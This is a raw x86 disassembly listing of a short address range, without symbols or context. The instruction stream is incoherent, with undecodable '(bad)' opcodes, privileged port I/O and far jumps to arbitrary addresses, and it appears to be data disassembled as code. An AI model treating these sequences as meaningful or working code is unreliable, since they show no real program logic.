  4182b6:	(bad)  
  4182b8:	or     bl,BYTE PTR [ebx]
  4182ba:	and    ecx,DWORD PTR ds:0x78674570
  4182c0:	iret   
  4182c1:	fdivr  st,st(1)
  4182c3:	mov    bl,0xd2
  4182c5:	push   ebp
  4182c6:	xchg   ebx,eax
  4182c7:	nop
  4182c8:	shl    DWORD PTR [edi],0x85
  4182cb:	loope  0x418320
  4182cd:	sbb    DWORD PTR ss:[edi-0x466c62e1],0x98ef8a0b
  4182d8:	mov    eax,ds:0xa2824a2
  4182dd:	dec    edx
  4182de:	jo     0x41830f
  4182e0:	pop    edx
  4182e1:	rol    BYTE PTR [edi],0x45
  4182e4:	lods   eax,DWORD PTR ds:[esi]
  4182e5:	dec    esi
  4182e6:	aad    0x11
  4182e8:	mov    al,ds:0x53b20b92
  4182ed:	das    
  4182ee:	jmp    eax
  4182f0:	mov    cl,0x5e
  4182f2:	idiv   BYTE PTR [esi*4+0x3db5dd56]
  4182f9:	es popa 
  4182fb:	and    al,0x78
  4182fd:	bound  ecx,QWORD PTR [edx-0xb]
  418300:	ror    DWORD PTR [ecx-0x1f2d4ace],cl
  418306:	hlt    
  418307:	retf   0xa5c8
  41830a:	adc    ebx,DWORD PTR [ebx-0x63561621]
  418310:	dec    ecx
  418311:	mov    dl,0x90
  418313:	add    eax,0x691f31dd
  418318:	idiv   DWORD PTR [esi+0x73]
  41831b:	lods   eax,DWORD PTR ds:[esi]
  41831c:	int    0x60
  41831e:	mov    esi,0x942a5cb0
  418323:	popa   
  418324:	test   DWORD PTR [eax+0x47],eax
  418327:	loop   0x41832c
  418329:	cmp    al,0x92
  41832b:	in     eax,dx
  41832c:	test   DWORD PTR [ebp+0x3],eax
  41832f:	les    edx,FWORD PTR [ebx+0x77b2e985]
  418335:	xchg   esp,eax
  418336:	int    0x88
  418338:	call   0x96c8:0x65eaf6ca
  41833f:	inc    ebp
  418340:	fist   DWORD PTR [edi]
  418342:	aam    0x3f
  418344:	retf   0x98e7
  418347:	(bad)  
  418348:	push   eax
  418349:	outs   dx,BYTE PTR ds:[esi]
  41834a:	add    BYTE PTR [eax+0x40],ch
  41834d:	push   0x39
  41834f:	jg     0x41833f
  418351:	push   0x7d04e864
  418356:	add    BYTE PTR [ebp+0x37],0x80
  41835a:	mov    dl,0xa7
  41835c:	sub    ch,BYTE PTR [edi+0x6f148842]
  418362:	fistp  QWORD PTR [edx-0x5366d21d]
  418368:	imul   ebx,DWORD PTR [ebx+esi*2+0x70671d75],0x6b4b687f
  418373:	cmp    eax,0x8fc623e
  418378:	push   ebp
  418379:	pop    ss
  41837a:	imul   ecx,DWORD PTR [eax+0x0],0x89274d1b
  418381:	das    
  418382:	adc    BYTE PTR [edx+0x0],0xd9
  418386:	hlt    
  418387:	js     0x4183cf
  418389:	jle    0x4183c6
  41838b:	push   ebp
  41838c:	xchg   esi,eax
  41838d:	clc    
  41838e:	cmp    DWORD PTR [ecx+edi*8+0x22bb1b69],eax
  418395:	sub    bl,al
  418397:	outs   dx,BYTE PTR ds:[esi]
  418398:	jo     0x4183c6
  41839a:	gs push edi
  41839c:	adc    BYTE PTR [ebp-0xd],dl
  41839f:	xor    eax,0x6e69ccd6
  4183a4:	xchg   esi,eax
  4183a5:	mov    al,ds:0x6e83ca4a
  4183aa:	or     al,0x3e
  4183ac:	and    eax,0x4d817b69
  4183b1:	loopne 0x418417
  4183b3:	cmp    al,0x14
  4183b5:	test   al,0xa5
  4183b7:	aam    0xb5
  4183b9:	push   eax
  4183ba:	ret    0x1e56
  4183bd:	rcl    BYTE PTR ds:0xe419dfed,cl
  4183c3:	cmp    ch,ah
  4183c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183c6:	and    eax,0xb8b94513
  4183cb:	mov    cl,0x8f
  4183cd:	loop   0x418355
  4183cf:	xchg   ebx,eax
  4183d0:	push   esi
  4183d1:	jmp    0x418436
  4183d3:	shr    DWORD PTR [ebx-0x21580169],cl
  4183d9:	cld    
  4183da:	mov    ds:0x641887c6,eax
  4183df:	popf   
  4183e0:	ja     0x41845e
  4183e2:	push   ebp
  4183e3:	cmp    edi,esi
  4183e5:	jge    0x418462
  4183e7:	pop    es
  4183e8:	dec    edi
  4183e9:	enter  0x6efe,0xcb
  4183ed:	inc    esi
  4183ee:	or     eax,0x9783bf8
  4183f3:	fnsave [edi-0x73dfd0ba]
  4183f9:	imul   esp,DWORD PTR [edi],0xd22f12f4
  4183ff:	jbe    0x4183e8
  418401:	into   
  418402:	inc    ecx
  418403:	xchg   ebx,ebp
  418405:	fild   QWORD PTR [ebx+0x6680f5e3]
  41840b:	cwde   
  41840c:	xchg   ebx,eax
  41840d:	daa    
  41840e:	test   esp,0x76502095
  418414:	arpl   WORD PTR [esi-0x5c],si
  418417:	jbe    0x418461
  418419:	mov    BYTE PTR [eax+0x3c],ah
  41841c:	or     DWORD PTR [edx+ebx*1],ebx
  41841f:	in     eax,dx
  418420:	cmp    bh,ah
  418422:	xor    eax,0x7fda9209
  418427:	push   esi
  418428:	sbb    DWORD PTR [ebp+0x4218c9eb],esp
  41842e:	test   dl,dh
  418430:	jmp    0x418464
  418432:	push   ebx
  418433:	arpl   WORD PTR [eax+0x4c],di
  418436:	and    DWORD PTR [edi-0x10cc9474],edx
  41843c:	shl    BYTE PTR [ebx],1
  41843e:	test   bh,bh
  418440:	jb     0x4183cd
  418442:	jnp    0x4184b1
  418444:	sbb    eax,edx
  418446:	retf   0x496e
  418449:	ja     0x41845b
  41844b:	into   
  41844c:	mov    BYTE PTR [ebx],bl
  41844e:	push   ds
  41844f:	pop    ebx
  418450:	test   dl,bl
  418452:	pushf  
  418453:	xor    esp,ebp
  418455:	jo     0x41843d
  418457:	push   esp
  418458:	jl     0x4184ad
  41845a:	in     eax,0x76
  41845c:	retf   0xf97d
  41845f:	jp     0x41840c
  418461:	push   cs
  418462:	xlat   BYTE PTR ds:[bx]
  418464:	cmp    DWORD PTR [edx+edx*4-0x1a38fdb1],edx
  41846b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41846c:	jl     0x418476
  41846e:	lock or BYTE PTR ds:[edi+0x26ebfc54],0x4e
  418477:	push   edx
  418478:	retf   
  418479:	pop    ebp
  41847a:	fist   WORD PTR [esi-0x25]
  41847d:	or     BYTE PTR [edx+0x72c11f4d],cl
  418483:	cmp    BYTE PTR [esi],0xdd
  418486:	xor    BYTE PTR [ecx+ebp*4+0x2],bh
  41848a:	loope  0x4184ad
  41848c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41848d:	ss sar ebp,1
  418490:	repz inc esp
  418492:	adc    dh,BYTE PTR [ebx]
  418494:	ds pop ss
  418496:	pop    edx
  418497:	test   dl,ch
  418499:	daa    
  41849a:	in     eax,0xc7
  41849c:	mov    ds:0x84c4f6b0,al
  4184a1:	cmp    dh,ah
  4184a3:	jge    0x418439
  4184a5:	cmp    bh,0x8e
  4184a8:	ja     0x4184a3
  4184aa:	mov    ah,0xf4
  4184ac:	fisttp DWORD PTR [edi+0x5120eea7]
  4184b2:	mov    ebp,0x38957d37
  4184b7:	push   0xb879b43a
  4184bc:	imul   ebx,esp,0xffffff8c
  4184bf:	cs aad 0x52
  4184c2:	mov    ah,0xc7
  4184c4:	dec    eax
  4184c5:	xor    BYTE PTR [ecx-0x13],al
  4184c8:	or     BYTE PTR [edi+edi*4-0x18e975f9],ch
  4184cf:	mov    eax,0x190df2cd
  4184d4:	shr    BYTE PTR [eax+0x194bf1f6],0xcd
  4184db:	arpl   WORD PTR [ebp-0x586042c7],si
  4184e1:	pop    ds
  4184e2:	fldcw  WORD PTR [ebx]
  4184e4:	out    0x39,eax
  4184e6:	loop   0x41846c
  4184e8:	popa   
  4184e9:	cmp    BYTE PTR [ecx+0xfe76e01],0xfe
  4184f0:	jo     0x418548
  4184f2:	mov    eax,0x74742e61
  4184f7:	sbb    ah,BYTE PTR [esi]
  4184f9:	push   DWORD PTR [edx-0x2f]
  4184fc:	pop    esp
  4184fd:	cwde   
  4184fe:	popf   
  4184ff:	ins    DWORD PTR es:[edi],dx
  418500:	(bad)  
  418501:	std    
  418502:	jne    0x41856c
  418504:	sbb    BYTE PTR [edx+0x17c1bf85],ch
  41850a:	mov    ah,0xa2
  41850c:	adc    eax,0x5d8f952c
  418511:	lds    ebx,FWORD PTR [ebx-0x5e]
  418514:	das    
  418515:	mov    cl,bl
  418517:	sti    
  418518:	out    dx,al
  418519:	jne    0x41856e
  41851b:	dec    edx
  41851c:	sub    eax,0x3f5f43e4
  418521:	mov    ebx,0xa421fe0f
  418526:	fld    QWORD PTR [ecx+0x61ab8b00]
  41852c:	push   es
  41852d:	mov    BYTE PTR [ecx],dh
  41852f:	dec    edx
  418530:	mov    ecx,0x1ef0028c
  418535:	mov    dl,0xf6
  418537:	test   DWORD PTR [esi],edx
  418539:	or     eax,0x7e294664
  41853e:	pop    edx
  41853f:	cmp    esi,ebx
  418541:	pop    ss
  418542:	clc    
  418543:	not    DWORD PTR [ebp-0x44584986]
  418549:	mov    fs,WORD PTR [ebx+0x73]
  41854c:	mov    eax,ds:0x6a0150eb
  418551:	cmp    al,0xf7
  418553:	in     eax,0x91
  418555:	mov    WORD PTR [edi],ds
  418557:	jns    0x4185d7
  418559:	and    BYTE PTR [ebx],ch
  41855b:	imul   ebx,DWORD PTR [eax+0x119d116],0x41611913
  418565:	call   0xd6be:0x9ec564e9
  41856c:	push   ecx
  41856d:	xchg   esp,eax
  41856e:	clc    
  41856f:	cli    
  418570:	sbb    esi,DWORD PTR [ebx+ebp*1-0x67d55f24]
  418577:	cmc    
  418578:	cmp    ah,BYTE PTR [edi]
  41857a:	cmp    ch,BYTE PTR [edx]
  41857c:	push   0xe1ae09a3
  418581:	inc    edx
  418582:	jnp    0x418524
  418584:	mov    bh,0x16
  418586:	jmp    0xe240f908
  41858b:	imul   esp,edi,0x38
  41858e:	rcr    BYTE PTR [eax],cl
  418590:	dec    ecx
  418591:	xchg   DWORD PTR [ecx+0x228e4b45],ecx
  418597:	sbb    cl,BYTE PTR [esi]
  418599:	fsubr  st(0),st
  41859b:	clc    
  41859c:	stos   BYTE PTR es:[edi],al
  41859d:	jo     0x418547
  41859f:	test   al,0x8b
  4185a1:	mov    ds,WORD PTR [ecx+0x65]
  4185a4:	shl    edx,0xb2
  4185a7:	scas   eax,DWORD PTR es:[edi]
  4185a8:	push   eax
  4185a9:	jne    0x418544
  4185ab:	repnz inc ebp
  4185ad:	xor    eax,0xa02b7713
  4185b2:	in     eax,dx
  4185b3:	xor    ah,BYTE PTR [ebx-0x2290a0db]
  4185b9:	mul    bh
  4185bb:	push   0x284892ee
  4185c0:	mov    eax,DWORD PTR [ebx+0x71]
  4185c3:	les    eax,FWORD PTR [eax+0x48fc33cc]
  4185c9:	pusha  
  4185ca:	int3   
  4185cb:	or     DWORD PTR [edx],esi
  4185cd:	inc    edx
  4185ce:	stos   BYTE PTR es:[edi],al
  4185cf:	and    al,0x24
  4185d1:	cdq    
  4185d2:	sbb    dh,BYTE PTR [esi+0x6c]
  4185d5:	dec    edx
  4185d6:	mov    ah,0x73
  4185d8:	loope  0x41856e
  4185da:	jne    0x4185c9
  4185dc:	push   cs
  4185dd:	add    DWORD PTR [edx*2-0x7f677ec3],edx
  4185e4:	ds out dx,al
  4185e6:	out    0x32,eax
  4185e8:	xchg   edi,eax
  4185e9:	pop    edx
  4185ea:	push   eax
  4185eb:	test   al,0x37
  4185ee:	sbb    DWORD PTR [esi-0x7f],0x66327629
  4185f5:	and    ecx,DWORD PTR [ecx+esi*1]
  4185f8:	push   0xce3d4711
  4185fd:	(bad)  [ecx+0x23e3c77e]
  418603:	and    ebx,DWORD PTR ds:0x351eeb81
  418609:	arpl   dx,si
  41860b:	loopne 0x418651
  41860d:	lock jo 0x4185de
  418610:	xlat   BYTE PTR ds:[ebx]
  418611:	aaa    
  418612:	hlt    
  418613:	mov    bl,0x20
  418615:	cmp    esp,esp
  418617:	jmp    0x241cf6ce
  41861c:	(bad)  
  41861d:	popa   
  41861e:	fs (bad) 
  418620:	out    0xbb,al
  418622:	jmp    0x418694
  418624:	inc    esi
  418625:	test   al,0x5a
  418627:	mov    al,0x15
  418629:	fstp   DWORD PTR [ecx+0x11]
  41862c:	jp     0x418656
  41862e:	enter  0xd050,0xae
  418632:	in     eax,0x69
  418634:	add    DWORD PTR [eax-0x75],0x61
  418638:	imul   esi
  41863a:	cmp    ebx,edx
  41863c:	aas    
  41863d:	add    eax,0xd66f119c
  418642:	lock and DWORD PTR [ecx+0x60],edx
  418646:	std    
  418647:	push   ds
  418648:	jno    0x418685
  41864a:	sbb    al,0xb4
  41864c:	lds    ebp,FWORD PTR [ebp-0x78]
  41864f:	cs in  eax,dx
  418651:	sar    BYTE PTR [ecx-0x52],0x7e
  418655:	push   es
  418656:	and    DWORD PTR [edx],esp
  418658:	fwait
  418659:	pop    eax
  41865a:	mov    bl,0x22
  41865c:	test   DWORD PTR [esi],esi
  41865e:	dec    edx
  41865f:	in     eax,dx
  418660:	addr16 pusha 
  418662:	push   esi
  418663:	dec    esp
  418664:	sub    al,0x55
  418666:	mov    DWORD PTR [ecx],0x13b099be
  41866c:	(bad)  
  41866d:	cmp    edi,DWORD PTR [ebx]
  41866f:	dec    ecx
  418670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418671:	dec    esi
  418672:	ror    DWORD PTR [ebx+0x51813390],0x42
  418679:	mov    al,0xd
  41867b:	sub    eax,0xf59c42a
  418680:	(bad)  
  418681:	enter  0xfc9d,0x78
  418685:	stos   DWORD PTR es:[edi],eax
  418686:	jo     0x4186ff
  418688:	div    BYTE PTR [ebx+eiz*1+0x39599029]
  41868f:	dec    esp
  418690:	outs   dx,BYTE PTR ds:[esi]
  418691:	(bad)  
  418692:	jo     0x41868f
  418694:	pushf  
  418695:	or     DWORD PTR [esi+0x3f305d96],ecx
  41869b:	stc    
  41869c:	lahf   
  41869d:	sbb    esp,ebx
  41869f:	imul   esi,DWORD PTR [edx-0x60],0xb36ef3fa
  4186a6:	ss fsub st,st(6)
  4186a9:	bound  eax,QWORD PTR [eax-0x31655707]
  4186af:	jmp    0x418661
  4186b1:	shufps xmm6,XMMWORD PTR [edx-0x6ff4292a],0xef
  4186b9:	mov    bl,bl
  4186bb:	cmp    bl,BYTE PTR [ebx+0x4d]
  4186be:	fwait
  4186bf:	rcr    DWORD PTR [ebp+0x5799aa2f],cl
  4186c5:	pushf  
  4186c6:	das    
  4186c7:	sub    ch,al
  4186c9:	fs mov dh,cl
  4186cc:	fidivr WORD PTR [ebx-0x24600223]
  4186d2:	outs   dx,BYTE PTR ds:[esi]
  4186d3:	pop    ds
  4186d4:	idiv   DWORD PTR [ecx+0x6137e53a]
  4186da:	push   esp
  4186db:	inc    eax
  4186dc:	in     eax,0xe1
  4186de:	pop    eax
  4186df:	pushf  
  4186e0:	or     eax,0x54b2131d
  4186e5:	push   edx
  4186e6:	jecxz  0x418682
  4186e8:	dec    edx
  4186e9:	push   ds
  4186ea:	sar    BYTE PTR ds:0xde5020f6,1
  4186f0:	in     al,0xe5
  4186f2:	mov    ds,WORD PTR [ebx+0x134ca718]
  4186f8:	sub    eax,0xd04b13de
  4186fd:	or     al,0xa0
  4186ff:	mov    ecx,0x66ee9aa5
  418704:	xchg   BYTE PTR [ecx+0x39674a6],ch
  41870a:	push   esi
  41870b:	or     dh,BYTE PTR ds:0xd7d2f90f
  418711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418712:	scas   eax,DWORD PTR es:[edi]
  418713:	or     ebp,DWORD PTR [eax+0x54]
  418716:	push   esi
  418717:	adc    dl,BYTE PTR [ebp-0x6d]
  41871a:	test   DWORD PTR [esp+edi*1],edi
  41871d:	icebp  
  41871e:	outs   dx,BYTE PTR ds:[esi]
  41871f:	pusha  
  418720:	call   0xf606dcd8
  418725:	add    ecx,DWORD PTR [eax]
  418727:	mov    eax,ds:0xe04c365e
  41872c:	in     eax,dx
  41872d:	cmp    al,ch
  41872f:	mov    ebx,0xf0f2218f
  418734:	stos   DWORD PTR es:[edi],eax
  418735:	sub    dh,BYTE PTR [eax+0x3773857a]
  41873b:	pop    es
  41873c:	pop    edi
  41873d:	fstp   st(2)
  41873f:	test   al,0xce
  418741:	fisubr WORD PTR [ecx-0x37d3df2d]
  418747:	jnp    0x418762
  418749:	aad    0xb6
  41874b:	out    0x65,eax
  41874d:	or     bl,BYTE PTR [esi]
  41874f:	adc    DWORD PTR [edx-0xff14f20],ebx
  418755:	push   ecx
  418756:	outs   dx,BYTE PTR ds:[esi]
  418757:	push   esi
  418758:	or     esp,ecx
  41875a:	sbb    DWORD PTR [eax],ebx
  41875c:	add    eax,DWORD PTR [ebx+edi*2+0x5ffbe39]
  418763:	jge    0x418703
  418765:	pusha  
  418766:	jl     0x418756
  418768:	mov    dl,0x34
  41876a:	pop    ecx
  41876b:	pop    ebp
  41876c:	rol    BYTE PTR ds:0x4dd91959,1
  418772:	and    BYTE PTR [ecx+0x7aa9a2bc],cl
  418778:	mov    esp,0xa87d2f76
  41877d:	add    al,BYTE PTR [esi]
  41877f:	test   DWORD PTR [ecx-0x2a6c577c],0xd15af29f
  418789:	mov    al,0x1c
  41878b:	cmc    
  41878c:	in     eax,dx
  41878d:	mov    ebp,0x8070ba40
  418792:	jge    0x418810
  418794:	pop    ds
  418795:	popa   
  418796:	xor    al,0x60
  418798:	sub    eax,0x1e73c043
  41879d:	sub    eax,0xb51b8cfa
  4187a2:	aad    0x59
  4187a4:	cmc    
  4187a5:	and    ecx,DWORD PTR [edi-0x69f65d9b]
  4187ab:	fisttp DWORD PTR [ebx+0x142ed8a4]
  4187b1:	dec    edi
  4187b2:	popf   
  4187b3:	cmp    DWORD PTR [esi+edi*8-0x1505850d],esi
  4187ba:	xchg   al,al
  4187bc:	hlt    
  4187bd:	mov    ebx,0x41823417
  4187c2:	shl    DWORD PTR [esi+0x519531a8],1
  4187c8:	bound  esi,QWORD PTR [eax+eiz*4]
  4187cb:	(bad)  
  4187cc:	xor    BYTE PTR [ebx-0x2b6f34c9],dl
  4187d2:	leave  
  4187d3:	call   0xccba:0x23b09107
  4187da:	ss pop ss
  4187dc:	retf   0x8c8
  4187df:	inc    BYTE PTR [ebp+edi*4-0x39]
  4187e3:	dec    eax
  4187e4:	arpl   WORD PTR [esi],di
  4187e6:	sbb    al,0x6e
  4187e8:	jbe    0x41885a
  4187ea:	xchg   ebx,eax
  4187eb:	gs mov ch,0x7
  4187ee:	dec    edi
  4187ef:	mov    edi,0x6f779011
  4187f4:	js     0x418801
  4187f6:	mov    eax,0x68d36f85
  4187fb:	pop    ecx
  4187fc:	lock out 0x3a,al
  4187ff:	mov    BYTE PTR [eax-0xdc1a2c8],ah
  418805:	inc    ecx
  418806:	cmp    dh,BYTE PTR [ecx]
  418808:	sbb    DWORD PTR [eax-0x75],esi
  41880b:	or     eax,0x913286cf
  418810:	ficomp WORD PTR [ecx-0x28090cb]
  418816:	cmc    
  418817:	in     eax,0x11
  418819:	push   0xb80194ef
  41881e:	inc    edi
  41881f:	mov    ebx,0x892ec321
  418824:	mov    esi,0x3b968d6c
  418829:	mov    edx,0xbf49a078
  41882e:	dec    ecx
  41882f:	outs   dx,BYTE PTR ds:[esi]
  418830:	or     ah,ch
  418832:	inc    ebp
  418833:	cmp    al,0x9b
  418835:	add    eax,0x9c8b6ef6
  41883a:	js     0x41883b
  41883c:	mov    edi,0x49b6aee5
  418841:	adc    BYTE PTR [esi+esi*2-0x7b],bh
  418845:	in     eax,0xef
  418847:	fsub   st,st(2)
  418849:	inc    edx
  41884a:	sub    esp,DWORD PTR [esi]
  41884c:	inc    ebx
  41884d:	inc    ecx
  41884e:	push   edx
  41884f:	sub    edi,DWORD PTR [edi]
  418851:	enter  0xf384,0x51
  418855:	imul   DWORD PTR [eax+0x35]
  418858:	cmp    BYTE PTR [eax],ch
  41885a:	jg     0x418834
  41885c:	jp     0x4188c6
  41885e:	dec    ebp
  41885f:	sbb    ebx,DWORD PTR [ebp+edi*8-0x48]
  418863:	gs fwait
  418865:	inc    ebx
  418866:	dec    edx
  418867:	sub    al,0x3e
  418869:	fild   QWORD PTR [esi-0x3a]
  41886c:	leave  
  41886d:	les    dx,DWORD PTR [ebp-0x2580e29a]
  418874:	clc    
  418875:	stc    
  418876:	sub    al,0x51
  418878:	aaa    
  418879:	adc    bl,BYTE PTR ds:0x90a1fc14
  41887f:	or     BYTE PTR [ebx],0x48
  418882:	or     eax,0x9d4fe39d
  418887:	es jae 0x418821
  41888a:	loope  0x418818
  41888c:	push   edx
  41888d:	adc    eax,0x5f429b8c
  418892:	gs in  al,dx
  418894:	scas   eax,DWORD PTR es:[edi]
  418895:	and    al,0xd2
  418897:	stos   BYTE PTR es:[edi],al
  418898:	sub    BYTE PTR [ebx],dh
  41889a:	dec    eax
  41889b:	inc    ebx
  41889c:	mov    ebx,0x28d7e15a
  4188a1:	add    BYTE PTR [edi],0xdf
  4188a4:	xchg   ebp,eax
  4188a5:	jecxz  0x41882d
  4188a7:	sbb    ah,bl
  4188a9:	jmp    0x6a19:0xad664378
  4188b0:	rcl    BYTE PTR [eax+0x2a3ace29],cl
  4188b6:	inc    esi
  4188b7:	jle    0x418938
  4188b9:	dec    esi
  4188ba:	ror    dl,0x5b
  4188bd:	repz mov ecx,0xef66d19d
  4188c3:	sub    eax,0x8fe28b9f
  4188c8:	dec    ecx
  4188c9:	push   esi
  4188ca:	fwait
  4188cb:	das    
  4188cc:	into   
  4188cd:	jp     0x4188db
  4188cf:	sub    al,0x7e
  4188d1:	adc    eax,0x86a466f0
  4188d6:	push   edx
  4188d7:	add    ebx,DWORD PTR [ebx]
  4188d9:	and    eax,0x70b26f50
  4188de:	leave  
  4188df:	in     al,dx
  4188e0:	ss out 0x51,eax
  4188e3:	pusha  
  4188e4:	sub    DWORD PTR [edi-0x658b2f7e],0x77689c3d
  4188ee:	int3   
  4188ef:	sbb    al,BYTE PTR [eax]
  4188f1:	pop    esi
  4188f2:	sbb    DWORD PTR [ecx+0x13],ebp
  4188f5:	push   cs
  4188f6:	jmp    0xa3f7e85b
  4188fb:	jp     0x418895
  4188fd:	mov    ?,WORD PTR [edi+0x40]
  418900:	lahf   
  418901:	or     edx,DWORD PTR [ebp+0x29]
  418904:	aas    
  418905:	jecxz  0x4188bc
  418907:	inc    BYTE PTR [ebp-0x5]
  41890a:	jmp    0x6687c569
  41890f:	pop    ecx
  418910:	mov    bl,0x4a
  418912:	pop    esi
  418913:	xchg   edx,eax
  418914:	and    ebp,DWORD PTR [ebx+0x2cd4c26a]
  41891a:	inc    eax
  41891b:	cdq    
  41891c:	xchg   BYTE PTR [edi],bh
  41891e:	xor    DWORD PTR [esp+eiz*8],ebp
  418921:	inc    esp
  418922:	xor    eax,0x71b64e7d
  418927:	std    
  418928:	ret    
  418929:	mov    edi,0x7e769f8d
  41892e:	cmp    BYTE PTR [eax-0x7f],dh
  418931:	xor    edx,DWORD PTR [esi-0x7d]
  418934:	int    0x23
  418936:	add    al,0x82
  418938:	push   edi
  418939:	inc    eax
  41893a:	int    0x56
  41893c:	fimul  DWORD PTR [edi+0x2d1b9268]
  418942:	test   ch,bl
  418944:	fwait
  418945:	cmp    al,0xba
  418947:	push   edx
  418948:	retf   0x2088
  41894b:	adc    al,0xc2
  41894d:	int3   
  41894e:	ret    0x85ae
  418951:	or     bl,BYTE PTR [edi-0x3337df8e]
  418957:	xchg   esi,eax
  418958:	in     eax,dx
  418959:	pop    ebx
  41895a:	test   al,0xe9
  41895c:	pop    ebp
  41895d:	das    
  41895e:	dec    edi
  41895f:	push   eax
  418960:	(bad)  
  418961:	xchg   esp,eax
  418962:	test   eax,0x37beeda9
  418967:	sti    
  418968:	mov    esi,0xf1df65a3
  41896d:	inc    esi
  41896e:	setle  BYTE PTR [ebx+0x46]
  418972:	sbb    ch,BYTE PTR [ebx+0x25b40795]
  418978:	outs   dx,BYTE PTR ds:[esi]
  418979:	(bad)  
  41897a:	sub    al,0x90
  41897c:	push   ds
  41897d:	xchg   esi,eax
  41897e:	xor    ebx,DWORD PTR [edi]
  418980:	cld    
  418981:	cmp    eax,0xc20446a9
  418986:	push   edx
  418987:	sbb    eax,0x3f4ca7a8
  41898c:	in     eax,dx
  41898d:	push   esi
  41898e:	mov    BYTE PTR [eax-0x648664b5],dl
  418994:	sub    al,dh
  418996:	xchg   ebx,eax
  418997:	cmc    
  418998:	mov    dl,0xd3
  41899a:	and    eax,0x7e4c1d76
  41899f:	in     eax,dx
  4189a0:	xor    DWORD PTR [ebx-0x16],0x6c
  4189a4:	jmp    0x418961
  4189a6:	ret    0x14ee
  4189a9:	div    esp
  4189ab:	mov    esi,0xaaed8b3e
  4189b0:	cmp    al,0x8b
  4189b2:	call   0x5adb94e
  4189b7:	dec    ecx
  4189b8:	enter  0x9d3c,0x63
  4189bc:	jmp    0xba2ad44c
  4189c1:	jo     0x4189f6
  4189c3:	clc    
  4189c4:	or     BYTE PTR [eax-0x5b],cl
  4189c7:	cmc    
  4189c8:	jno    0x418956
  4189ca:	ss push eax
  4189cc:	pop    esi
  4189cd:	sub    BYTE PTR [ecx],dl
  4189cf:	cs ss pusha 
  4189d2:	jae    0x4189b0
  4189d4:	shr    dl,1
  4189d6:	xlat   BYTE PTR ds:[ebx]
  4189d7:	lea    edi,[edi]
  4189d9:	dec    esp
  4189da:	mov    ebp,0x21e1cc5b
  4189df:	shl    DWORD PTR [eax-0x42d4c277],0xf4
  4189e6:	mov    ebx,0x50f0cec4
  4189eb:	or     eax,ebp
  4189ed:	out    0x4b,eax
  4189ef:	sahf   
  4189f0:	adc    BYTE PTR [ecx+0x6a],dl
  4189f3:	sub    BYTE PTR [ebp+0x6744a6ab],dh
  4189f9:	into   
  4189fa:	lea    ebx,[edi]
  4189fc:	mov    al,ds:0x6aeb35e3
  418a01:	cmp    DWORD PTR [edi+eax*1-0xf],ecx
  418a05:	pop    ds
  418a06:	xor    ebx,ebx
  418a08:	pusha  
  418a09:	aaa    
  418a0a:	mov    ds:0x3d533aca,eax
  418a0f:	mov    dl,0xa4
  418a11:	pushf  
  418a12:	push   ebp
  418a13:	xor    DWORD PTR [edi+eiz*2+0x48c9617],esi
  418a1a:	jecxz  0x418a73
  418a1c:	test   DWORD PTR [ecx+0x33],0xc26bde81
  418a23:	mov    ebp,0x5d56192a
  418a28:	imul   DWORD PTR [ebx]
  418a2a:	mov    dl,0xb2
  418a2c:	outs   dx,BYTE PTR ds:[esi]
  418a2d:	les    edi,FWORD PTR [edi+ecx*2+0x30]
  418a31:	mov    ebx,0x4007c781
  418a36:	and    al,0xb0
  418a38:	pusha  
  418a39:	jg     0x418a9a
  418a3b:	mov    ah,0xed
  418a3d:	mov    ebp,0x73532719
  418a42:	mov    dh,0x41
  418a44:	sbb    eax,0xabbf9c12
  418a49:	test   dl,bl
  418a4b:	jmp    0xad3d02b1
  418a50:	stos   BYTE PTR es:[edi],al
  418a51:	cmp    ecx,DWORD PTR [ecx]
  418a53:	aam    0x9
  418a55:	mov    DWORD PTR [edx+0x20],edi
  418a58:	lock cmp eax,0xcb5ee07
  418a5e:	shl    cl,cl
  418a60:	test   ah,al
  418a62:	jb     0x418a67
  418a64:	cmp    ebp,DWORD PTR [esi-0x74]
  418a67:	mov    WORD PTR [edx],?
  418a69:	xlat   BYTE PTR ds:[ebx]
  418a6a:	aad    0x9e
  418a6c:	stos   DWORD PTR es:[edi],eax
  418a6d:	jno    0x418a75
  418a6f:	jae    0x418ac0
  418a71:	scas   al,BYTE PTR es:[edi]
  418a72:	mov    ?,WORD PTR [esi-0x6]
  418a75:	cmp    DWORD PTR [ebp+0x43],0xffffffe5
  418a79:	jecxz  0x418ae3
  418a7b:	push   ecx
  418a7c:	xchg   edi,eax
  418a7d:	test   al,0x5c
  418a7f:	jge    0x418a42
  418a81:	or     ah,al
  418a83:	xor    al,0xbd
  418a85:	(bad)  
  418a86:	xor    BYTE PTR [ecx+0x1f2996fb],ah
  418a8c:	and    eax,0x85bd391a
  418a91:	jae    0x418a35
  418a93:	jg     0x418ac7
  418a95:	jmp    0x3628ae07
  418a9a:	dec    ecx
  418a9b:	mov    edi,DWORD PTR [edi+0x17683d0c]
  418aa1:	inc    edi
  418aa2:	int    0xbd
  418aa4:	cmp    ch,BYTE PTR [edx+0x1165a098]
  418aaa:	(bad)  
  418aab:	ror    BYTE PTR [ebp-0x55],cl
  418aae:	neg    DWORD PTR [edx+0x1055daed]
  418ab4:	inc    esi
  418ab5:	adc    al,0x78
  418ab7:	adc    edx,DWORD PTR [edx+0x31]
  418aba:	lods   eax,DWORD PTR ds:[esi]
  418abb:	mov    ebp,0x7b786bbe
  418ac0:	jg     0x418a8e
  418ac2:	ds add al,0x69
  418ac5:	addr16 push ebx
  418ac7:	test   eax,0x3c013ae6
  418acc:	fdiv   DWORD PTR [esi+0x595ed7ea]
  418ad2:	pop    edx
  418ad3:	jne    0x418ab2
  418ad5:	gs jno 0x418b34
  418ad8:	rol    DWORD PTR [esi-0x406408fa],1
  418ade:	jge    0x418b22
  418ae0:	das    
  418ae1:	outs   dx,DWORD PTR ds:[esi]
  418ae2:	dec    edi
  418ae3:	push   ds
  418ae4:	ret    
  418ae5:	or     BYTE PTR [ebx-0x462fcf84],ch
  418aeb:	xor    eax,0x44d302cd
  418af0:	push   ecx
  418af1:	retf   
  418af2:	sub    BYTE PTR [eax-0x6866334f],bl
  418af8:	ins    BYTE PTR es:[edi],dx
  418af9:	cmp    DWORD PTR [ebx-0x47d4caed],esp
  418aff:	mov    eax,ds:0xb9d5cf1
  418b04:	jmp    0x418aca
